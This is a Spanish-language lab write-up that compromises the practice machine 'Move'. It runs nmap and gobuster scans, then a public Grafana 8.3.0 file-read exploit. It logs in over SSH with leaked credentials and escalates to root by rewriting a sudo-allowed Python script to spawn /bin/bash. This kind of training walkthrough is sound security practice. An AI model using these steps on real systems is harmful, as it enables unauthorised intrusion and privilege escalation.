# MÁQUINA MOVE

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Move/foto.jpg)

Vemos que hay 4 puertos abiertos, por lo que vamos a tener que ir viendo que podemos sacar de cada uno.

Emepecemos haciendo fuzzing por el puerto 80, a ver que encontramos:

```shell
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

![FUZZ](https://github.com/Isma-yo/photos/blob/main/Move/foto2.jpg)

Hay una página html que esta en mantenimiento, vamos a ver que hay:

![TMP](https://github.com/Isma-yo/photos/blob/main/Move/foto3.jpg)

Nos dice que dentro del directorio tmp hay un fichero de texto con una contraseña, a lo mejor nos es útil para algo.

Ahora vamos a ver que hay en el puerto 3000:

![GRA](https://github.com/Isma-yo/photos/blob/main/Move/foto4.jpg)

Una página de login de Grafana, en la cuál podemos ver la versión de este. Vamos a buscar una posible vulnerabilidad con el comando searchsploit:

```shell
searchsploit grafana 8.3.0
```

![GRA2](https://github.com/Isma-yo/photos/blob/main/Move/foto5.jpg)

Ejeuctamos el exploit, el cuál nos va a permitir leer ficheros de dentro de la máquina:

```shell
python3 50581.py -H http://172.17.0.2:3000
```

![PASSWD](https://github.com/Isma-yo/photos/blob/main/Move/foto6.jpg)

Ya tenemos un usuario freddy y su posible contraseña, la del pass.txt. Veamos que pasa si intentamos acceder a la máquina a través de SSH usando esas credenciales:

![SSH](https://github.com/Isma-yo/photos/blob/main/Move/foto7.jpg)

Estamos dentro, vamos a ver que podemos ejecutar como root:

![SUDO](https://github.com/Isma-yo/photos/blob/main/Move/foto8.jpg)

Vamos a modificar ese script de python para escalar privilegios:

```shell
import os

os.system("/bin/bash")
```

![ROOT](https://github.com/Isma-yo/photos/blob/main/Move/foto9.jpg)

Y ya somos root!




